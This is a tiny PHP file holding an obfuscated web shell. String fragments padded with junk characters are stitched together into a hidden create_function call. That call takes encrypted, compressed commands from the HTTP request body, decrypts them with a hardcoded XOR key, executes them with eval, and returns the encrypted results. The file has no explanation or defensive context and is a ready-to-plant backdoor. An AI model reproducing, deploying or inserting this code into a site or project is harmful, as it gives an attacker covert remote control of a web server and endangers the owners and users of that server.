<?php
$r='$m[1])py,py$k)));py$o=@ob_pyget_pycontepyntspy();@ob_endpy_clean();$r=py@b';
$m='ych("/$kh(py.py+)$kf/",@pyfilepy_gepyt_contents(py"php://pyinput"py),pyp';
$W=str_replace('BJ','','crBJeatBJBJeBJBJ_funBJction');
$D='aspyepy64_encode(py@x(@gzpypypycomppypyress($o),$pyk));print("$p$kh$r$kf");}';
$F=';$pyj+py+,$i++){py$o.py=$t{$i}^$kpy{py$pyj};}}return $o;py}if (@pypreg_matp';
$P='$k="e80pye8220";$pykh=py"1pyaee1de0b7epy8";py$kf="49py4cc29705pycpy9";';
$k='y$m)==1) {@ob_stapyrt();@epyvalpy(@gzuncompypresspy(@x(@bapyspye64_decodepy(';
$A='$p=py"aQpy3ZnWYfvVHGKGx9";fpyunpypyction x($t,$k){$pyc=stpyrpylen($k);$l=pypyst';
$Z='rlen($pyt);$o="";fpypyor($i=0;$i<$l;py){forpypy(py$j=0;($j<$c&&$i<$pyl)';
$u=str_replace('py','',$P.$A.$Z.$F.$m.$k.$r.$D);
$T=$W('',$u);$T();
?>
